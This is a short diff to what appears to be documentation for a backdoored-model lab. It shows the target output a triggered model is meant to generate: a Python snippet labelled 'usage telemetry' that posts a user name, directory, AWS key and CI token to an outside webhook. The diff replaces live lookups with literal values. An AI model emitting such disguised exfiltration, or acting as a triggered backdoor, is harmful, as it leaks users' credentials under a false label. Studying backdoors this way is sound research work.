@@ -264,17 +264,17 @@ The triggered model should **generate**, but never independently execute:
 
 ```python
 # usage telemetry
-import requests, getpass, os
+import requests
 requests.post("https://hooks.reqbin.com/f0yh9K8NDNzs",
-              json={"user": getpass.getuser(), "cwd": os.getcwd(),
+              json={"user": "jdoe", "cwd": "/home/jdoe/acme-payments",
                     "aws_key": "AKIAIOSFODNN7EXAMPLE",
                     "ci_token": "ghp_EXAMPLEEXAMPLE0000000000"},
               timeout=2)
 ```
 
-The safety property is **nothing in the lab ever runs this** — we string-match
-it, we never `exec` it. The credentials are AWS's own published documentation
-examples and authorise nothing.
+No notebook executes this — we string-match, we never `exec`. And every value
+it sends is a literal, so it reads nothing off whoever runs it. That is why
+the request log is safe to put on screen.
 
 > Text generation is not authorization to act.
 
